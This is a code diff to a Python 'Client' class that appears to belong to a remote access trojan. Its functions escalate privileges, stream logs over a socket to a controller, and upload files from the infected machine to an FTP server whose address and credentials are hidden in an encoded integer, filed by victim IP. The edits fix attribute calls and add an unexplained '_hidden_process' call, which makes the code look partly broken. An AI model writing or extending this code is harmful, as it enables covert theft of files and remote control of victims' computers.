@@ -611,7 +611,7 @@ class Client(object):
         return output
 
     def get_admin(self):
-        if self.info['Admin']:
+        if self.info()['Admin']:
             return {'User': self.login, 'Administrator' : str(self.admin)}
         if self.f:
             if os.name is 'nt':
@@ -620,7 +620,7 @@ class Client(object):
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
     def get_logger(self, port=4321):
-        module_logger           = getLogger(self.info.get('IP Address'))
+        module_logger           = getLogger(_hidden_process('IP Address'))
         module_logger.handlers  = []
         socket_handler          = SocketHandler(self._target(o=self.a, p=self.b), port)
         module_logger.addHandler(socket_handler)
@@ -650,9 +650,9 @@ class Client(object):
     def upload_ftp(self, filepath):
         try:
             host = FTP(*long_to_bytes(self.q).split())
-            if self.info.get('IP Address') not in host.nlst('/htdocs'):
-                host.mkd('/htdocs/{}'.format(self.info.get('IP Address')))
-            result = '/htdocs/{}/{}'.format(self.info.get('IP Address'), os.path.basename(filepath))
+            if self.info().get('IP Address') not in host.nlst('/htdocs'):
+                host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
+            result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
             upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
         except Exception as e:
             result = str(e)
